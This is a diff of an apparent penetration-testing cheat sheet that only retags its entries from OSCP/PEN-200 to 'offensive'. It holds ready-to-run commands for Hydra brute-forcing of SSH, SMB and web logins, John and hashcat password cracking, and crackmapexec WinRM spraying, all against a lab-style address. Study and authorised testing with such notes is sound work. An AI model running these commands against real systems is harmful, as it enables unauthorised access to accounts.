@@ -13,7 +13,7 @@ hydra -l {{username}} -P {{pass-file}} {{target-ip}} ssh -t 4
 hydra -l root -P /usr/share/wordlists/rockyou.txt 10.10.10.10 ssh -t 4
 ```
 
-Tags :  #linux #hydra #ssh #oscp #pen-200
+Tags :  #linux #hydra #ssh #offensive
 
 ---
 
@@ -30,7 +30,7 @@ hydra -L {{user-file}} -p '{{password}}' {{target-ip}} ssh -t 4
 hydra -L users.txt -p 'Password1!' 10.10.10.10 ssh -t 4
 ```
 
-Tags :  #linux #hydra #ssh #oscp #pen-200
+Tags :  #linux #hydra #ssh #offensive
 
 ---
 
@@ -47,7 +47,7 @@ hydra -l {{username}} -P {{pass-file}} {{target-ip}} smb -t 4
 hydra -l administrator -P /usr/share/wordlists/rockyou.txt 10.10.10.10 smb -t 4
 ```
 
-Tags :  #linux #hydra #smb #oscp #pen-200
+Tags :  #linux #hydra #smb #offensive
 
 ---
 
@@ -64,7 +64,7 @@ hydra -l {{username}} -P {{pass-file}} "{{url}}" http-post-form "/login:username
 hydra -l admin -P /usr/share/wordlists/rockyou.txt "10.10.10.10" http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid" -t 4
 ```
 
-Tags :  #linux #hydra #web #oscp #pen-200
+Tags :  #linux #hydra #web #offensive
 
 ---
 
@@ -81,7 +81,7 @@ john --wordlist={{pass-file}} {{file}}
 john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
 ```
 
-Tags :  #linux #john #hash #oscp #pen-200
+Tags :  #linux #john #hash #offensive
 
 ---
 
@@ -98,7 +98,7 @@ hashcat -m 0 {{hash}} {{pass-file}} --force
 hashcat -m 0 5f4dcc3b5aa765d61d8327deb882cf99 /usr/share/wordlists/rockyou.txt --force
 ```
 
-Tags :  #linux #hashcat #hash #oscp #pen-200
+Tags :  #linux #hashcat #hash #offensive
 
 ---
 
@@ -115,7 +115,7 @@ hashcat -m 5600 {{file}} {{pass-file}}
 hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
-Tags :  #linux #hashcat #ntlm #oscp #pen-200
+Tags :  #linux #hashcat #ntlm #offensive
 
 ---
 
@@ -132,6 +132,6 @@ crackmapexec winrm {{target-ip}} -u {{user-file}} -p {{pass-file}}
 crackmapexec winrm 10.10.10.10 -u users.txt -p passwords.txt
 ```
 
-Tags :  #linux #crackmapexec #winrm #oscp #pen-200
+Tags :  #linux #crackmapexec #winrm #offensive
 
 ---
